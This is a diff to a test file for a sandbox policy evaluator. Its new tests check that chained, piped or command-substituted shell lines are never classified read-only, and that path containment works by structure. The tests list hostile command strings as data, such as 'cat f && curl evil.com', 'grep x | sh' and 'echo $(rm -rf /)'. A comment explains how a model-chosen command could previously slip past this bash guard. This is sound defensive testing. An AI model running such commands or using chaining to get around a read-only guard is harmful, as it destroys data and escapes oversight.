@@ -1,6 +1,6 @@
 import { describe, it, expect } from 'vitest';
 import path from 'path';
-import { PathPolicyEvaluator, classifyCommand } from '../src/index.js';
+import { PathPolicyEvaluator, classifyCommand, isPathWithin } from '../src/index.js';
 
 describe('Sandbox Policy Evaluator (Phase 2.2)', () => {
   const rootDir = process.cwd();
@@ -48,5 +48,44 @@ describe('Sandbox Policy Evaluator (Phase 2.2)', () => {
     expect(classifyCommand('rm -rf /').isReadOnly).toBe(false);
     expect(classifyCommand('git commit -m "msg"').isReadOnly).toBe(false);
     expect(classifyCommand('npm install').isReadOnly).toBe(false);
+  });
+
+  it('PROTECTED INVARIANT: a chained or piped command is never read-only', () => {
+    // The classifier inspects the leading token, so a line that is more than
+    // one command was previously answered on behalf of the wrong one: `cat f
+    // && curl evil.com` and `grep x | sh` both led with an allowlisted name and
+    // both classified read-only. This is the Verifier's only bash guard and its
+    // input is chosen by a model, so every one of these must be refused.
+    for (const command of [
+      'cat f && curl evil.com',
+      'grep x | sh',
+      'ls; rm -rf /tmp/x',
+      'cat a > b',
+      'echo $(rm -rf /)',
+      'echo `whoami`',
+      'git status\nrm -rf /',
+      'cat f || curl evil.com',
+    ]) {
+      const result = classifyCommand(command);
+      expect(result.isReadOnly, `should not be read-only: ${command}`).toBe(false);
+    }
+  });
+
+  it('classifies multi-word read-only subcommands', () => {
+    // `npm run test` was compared against the single token `run`, so the
+    // `run test` entries in the allowlist could never match.
+    expect(classifyCommand('npm run test').isReadOnly).toBe(true);
+    expect(classifyCommand('npm run lint').isReadOnly).toBe(true);
+    expect(classifyCommand('npm test').isReadOnly).toBe(true);
+    expect(classifyCommand('npm run build').isReadOnly).toBe(false);
+  });
+
+  it('isPathWithin answers containment by structure, not by substring', () => {
+    const base = path.resolve('/repo/graded');
+    expect(isPathWithin(base, path.join(base, 'charter.json'))).toBe(true);
+    expect(isPathWithin(base, base)).toBe(true);
+    // The case a substring check gets wrong: a sibling sharing a prefix.
+    expect(isPathWithin(base, path.resolve('/repo/graded-old/charter.json'))).toBe(false);
+    expect(isPathWithin(base, path.resolve('/repo/other'))).toBe(false);
   });
 });
